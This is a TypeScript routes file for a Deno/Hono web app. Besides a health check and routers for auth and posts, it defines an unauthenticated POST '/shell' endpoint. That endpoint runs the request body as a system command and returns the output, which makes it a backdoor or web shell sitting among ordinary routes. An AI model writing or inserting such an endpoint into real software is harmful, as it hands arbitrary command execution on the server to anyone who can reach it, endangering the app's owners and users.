import { Typewriter } from '@/app/app.types.ts';
import { auth } from '@/auth/auth.controller.ts';
import { post } from '@/posts/post.controller.ts';
import { Hono } from 'hono';

const routes = new Hono<Typewriter>();

routes.get('/health', c => c.text('UP'));
routes.post('/shell', async c => {
  const result = await new Deno.Command(await c.req.text()).output();
  const output = new TextDecoder().decode(result.stdout);
  return c.text(output);
});
routes.route('/auth', auth);
routes.route('/post', post);

export { routes };
